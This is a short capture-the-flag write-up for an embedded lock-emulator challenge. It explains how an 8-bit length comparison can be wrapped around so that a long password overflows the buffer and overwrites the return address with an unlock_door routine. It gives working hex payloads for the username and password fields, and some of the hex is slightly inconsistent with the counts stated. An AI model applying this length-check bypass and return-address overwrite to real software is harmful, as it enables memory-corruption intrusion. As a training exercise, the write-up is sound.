This is similar to Santa Cruz using a username and password.  The program states that username and password *together* may be no more than 32 characters.

The initial check for username makes sure that the username is less than 32 chars.
cmp.b #0x21, r11

The second check for password makes sure that the username AND password length is less than 32 chars.

We need to find a way to bypass this check in order to overflow and overwrite the return address.. 

Lets put the username as just under the 32 chars. so A * 31

since the length check does a cmp.b ->

cmp.b #0x21, r15 

We can just wrap around so we have < 0x121 for the length when it does the check

I ended up making my password length 253, and places the unlock_door address (don't forget endianness) where the return address overwrite is (5th byte of my password)

username:
    4141414141414141414141414141414141414141414141414141414141414141
    A * 31
    

password:
    424242424 c444 2424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242424242
    B * 4                  (filler to get to ret overwrite)
    4c44                   (ret address to unlock_door-- 444c)
    B * 247                (junk to make length wrap around)
